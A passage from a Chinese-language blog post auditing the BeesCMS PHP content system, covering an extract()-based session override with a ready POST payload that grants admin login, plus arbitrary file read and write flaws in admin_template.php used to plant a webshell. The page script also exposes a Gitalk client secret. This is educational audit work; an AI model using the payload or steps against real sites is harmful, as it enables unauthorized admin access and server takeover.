invoke__">fl_value</span>(<span class="variable">$_GET</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">@<span class="title function_ invoke__">extract</span>(<span class="variable">$_COOKIE</span>);</span><br></pre></td></tr></table></figure>

<p>附上extract() 函数简单简介</p>
<blockquote>
<p><em>PHP extract() 函数是从数组中把变量导入到当前的符号表中进行变量覆盖</em></p>
</blockquote>
<p>如果我们利用extract() 函数覆盖session 的内容如何呢？毕竟在代码的上方开启了session。</p>
<p>fl_value() 函数的内容我们在SQL注入那里分析过，会进行一些过滤，但是我们发现这里的POST是没有进行过滤的，我们就利用POST来进行session变量覆盖</p>
<p>在我们的首页<code>index.php</code>中就发现引用了这个<code>includes/init.php</code>文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;CMS&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/init.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/fun.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;includes/lib.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>因此，访问首页直接传递POST即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[login_in]=<span class="number">1</span>&amp;_SESSION[admin]=<span class="number">1</span>&amp;_SESSION[login_time]=<span class="number">1729688888</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022230933955.png" alt="image-20241022230933955"></p>
<h1 id="六、任意文件读取漏洞"><a href="#六、任意文件读取漏洞" class="headerlink" title="六、任意文件读取漏洞"></a>六、任意文件读取漏洞</h1><p>在<code>admin/admin_template.php</code>文件中存在一个任意文件读取漏洞，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//模板修改界面</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$action</span>==<span class="string">&#x27;xg&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="variable">$path</span>=CMS_PATH.<span class="variable">$file</span>;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;r+&#x27;</span>))&#123;<span class="title function_ invoke__">err</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;模板打开失败,请确定【&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;】模板是否存在&lt;/span&gt;&#x27;</span>);&#125;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line">	<span class="variable">$str</span>=@<span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>,<span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">	<span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&amp;&quot;</span>,<span class="string">&quot;&amp;amp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">	<span class="variable">$str</span>= <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;&amp;#39;&quot;</span>,<span class="string">&quot;&amp;quot;&quot;</span>,<span class="string">&quot;&amp;lt;&quot;</span>,<span class="string">&quot;&amp;gt;&quot;</span>),<span class="variable">$str</span>);</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见，对传入要读取的file 文件并没有做限制，导致任意文件的读取</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022234433046.png" alt="image-20241022234433046"></p>
<h1 id="七、任意文件写入漏洞"><a href="#七、任意文件写入漏洞" class="headerlink" title="七、任意文件写入漏洞"></a>七、任意文件写入漏洞</h1><p>同样在<code>admin/admin_template.php</code>文件中存在一个任意文件写入漏洞，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//处理模板修改</span></span><br><span class="line"><span class="keyword">elseif</span>(<span class="variable">$action</span>==<span class="string">&#x27;save_template&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$template</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	<span class="variable">$template</span>=<span class="title function_ invoke__">stripslashes</span>(<span class="variable">$template</span>);</span><br><span class="line">	<span class="variable">$path</span>=CMS_PATH.<span class="variable">$file</span>;</span><br><span class="line">	<span class="comment">//判断文件是否存在</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))&#123;<span class="title function_ invoke__">msg</span>(<span class="string">&#x27;不存在该文件，请重新操作&#x27;</span>);&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="variable">$fp</span>=@<span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>,<span class="string">&#x27;w+&#x27;</span>))&#123;<span class="title function_ invoke__">err</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;模板打开失败,请确定【&#x27;</span>.<span class="variable">$file</span>.<span class="string">&#x27;】模板是否存在&lt;/span&gt;&#x27;</span>);&#125;</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_EX);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$template</span>);</span><br><span class="line">	<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>,LOCK_UN);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里使用了一个<code>stripslashes</code>函数对我们传入的数据进行了过滤，这个函数只是去除字符串中的反斜杠\，不影响我们写入webshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;1&#x27;2\&quot;3&lt;4&gt;5? 6&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;  <span class="comment">// 输出：1&#x27;2&quot;3&lt;4&gt;5? 6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以beescms根目录下的phpinfo.php 文件为例写入webshell</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022235331691.png" alt="image-20241022235331691"></p>
<p>成功写入</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Lusen</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/24/Code-Audit-PHP-Beescms/">http://example.com/2024/07/24/Code-Audit-PHP-Beescms/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Lusen的小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="/img/42.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/24/OSCP-Dawn1/" title="【OSCP系列】OSCP靶机-Dawn1"><img class="cover" src="/img/friend_404.gif" data-original="/img/oscp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【OSCP系列】OSCP靶机-Dawn1</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/23/CTF-competition-PHPserialize-pop/" title="【CTF竞赛】[NISACTF 2022]popchains—PHP反序列化POP链"><img class="cover" src="/img/friend_404.gif" data-original="/img/48.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【CTF竞赛】[NISACTF 2022]popchains—PHP反序列化POP链</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/10/30/Code-Audit-PHP-Bluecms/" title="【PHP代码审计】Bluecms代码审计"><img class="cover" src="/img/friend_404.gif" data-original="/img/42.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-30</div><div class="title">【PHP代码审计】Bluecms代码审计</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/friend_404.gif" data-original="/img/logo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Lusen</div><div class="author-info__description">学无止境</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Lusensec" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=811209815&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:811209815@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章和相关工具仅供学习参考，禁止用于其他！！！未经授权禁止利用文章中的技术或工具对任何计算机或其他终端系统进行入侵操作，否则造成的直接或间接的后果和损失，均由使用者本人承担，本人不为此承担任何责任。如需转载或传播文章，需保证文章的完整性！文章如有侵权行为，请联系告知，我们会立即删除或修改并致歉！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">一、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">二、后台登陆SQL注入漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0Getshell"><span class="toc-text">三、后台文件上传Getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E4%BB%BB%E6%84%8FPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">四、任意PHP文件包含漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E"><span class="toc-text">五、水平越权漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-text">六、任意文件读取漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">七、任意文件写入漏洞</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/01/03/Python-Video-cracking/" title="【Python武器库】VIP视频免费观看"><img src="/img/friend_404.gif" data-original="/img/Python%E6%AD%A6%E5%99%A8%E5%BA%93.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Python武器库】VIP视频免费观看"/></a><div class="content"><a class="title" href="/2025/01/03/Python-Video-cracking/" title="【Python武器库】VIP视频免费观看">【Python武器库】VIP视频免费观看</a><time datetime="2025-01-03T09:03:05.000Z" title="发表于 2025-01-03 17:03:05">2025-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/29/Python-Comprehensive-Growth-Toolbox/" title="【Python武器库】综合成长型工具箱-Comprehensive_Growth_Toolbox"><img src="/img/friend_404.gif" data-original="/img/Python%E6%AD%A6%E5%99%A8%E5%BA%93.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Python武器库】综合成长型工具箱-Comprehensive_Growth_Toolbox"/></a><div class="content"><a class="title" href="/2024/11/29/Python-Comprehensive-Growth-Toolbox/" title="【Python武器库】综合成长型工具箱-Comprehensive_Growth_Toolbox">【Python武器库】综合成长型工具箱-Comprehensive_Growth_Toolbox</a><time datetime="2024-11-29T15:56:26.000Z" title="发表于 2024-11-29 23:56:26">2024-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/27/Code-RuoYi-4-6-0/" title="【Java代码审计】若依框架-4.6.0"><img src="/img/friend_404.gif" data-original="/img/42.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Java代码审计】若依框架-4.6.0"/></a><div class="content"><a class="title" href="/2024/11/27/Code-RuoYi-4-6-0/" title="【Java代码审计】若依框架-4.6.0">【Java代码审计】若依框架-4.6.0</a><time datetime="2024-11-26T21:53:11.000Z" title="发表于 2024-11-27 05:53:11">2024-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/30/Code-Audit-PHP-Bluecms/" title="【PHP代码审计】Bluecms代码审计"><img src="/img/friend_404.gif" data-original="/img/42.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【PHP代码审计】Bluecms代码审计"/></a><div class="content"><a class="title" href="/2024/10/30/Code-Audit-PHP-Bluecms/" title="【PHP代码审计】Bluecms代码审计">【PHP代码审计】Bluecms代码审计</a><time datetime="2024-10-30T13:16:04.000Z" title="发表于 2024-10-30 21:16:04">2024-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/" title="【Java代码审计】华夏-ERPv2.3"><img src="/img/friend_404.gif" data-original="/img/42.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【Java代码审计】华夏-ERPv2.3"/></a><div class="content"><a class="title" href="/2024/10/20/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/" title="【Java代码审计】华夏-ERPv2.3">【Java代码审计】华夏-ERPv2.3</a><time datetime="2024-10-20T12:23:30.000Z" title="发表于 2024-10-20 20:23:30">2024-10-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/42.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By Lusen</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"><script>(() => {
  const initGitalk = () => {
    const gitalk = new Gitalk(Object.assign({
      clientID: 'Ov23li2aqUZ7ZPOWWmQN',
      clientSecret: '475230627a309622f6670ff36d2ea102226a3d1d',
      repo: 'lusensec.github.io',
      owner: 'Lusensec',
      admin: ['Lusensec'],
      id: 'f64bf86da8939b4fd6c4b13c4fd0a96e',
      updateCountCallback: commentCount
    },))

    gitalk.render('gitalk-container')
  }

  const loadGitalk = async() => {
    if (typeof Gitalk === 'function') initGitalk()
    else {
      await getCSS('https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.css')
      await getScript('https://cdn.jsdelivr.net/npm/gitalk@1.8.0/dist/gitalk.min.js')
      initGitalk()
    }
  }
  
  const commentCount = n => {
    const isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
    if (isCommentCount) {
      isCommentCount.textContent= n
    }
  }

  if ('Gitalk' === 'Gitalk' || !true) {
    if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
    else loadGitalk()
  } else {
    window.loadOtherComment = loadGitalk
  }
})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="true" data-text="富强💖,民主💖,文明💖,和谐💖,平等💖,公正💖,法治💖,爱国💖,敬业💖,诚信💖,友善💖" data-fontsize="20px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,d=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=o());for(var e,i=0;i<d.length;i++)0<=(e=(e=d[i]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,a,n,o=d[i];e=function(){d=d.filter(function(t){return o!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(o)},(t=o).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,n=t.getAttribute("data-original"),a.onload=function(){t.src=n,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=n},t.src!==n&&(a.src=n)))}()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)}(this);</script></body></html>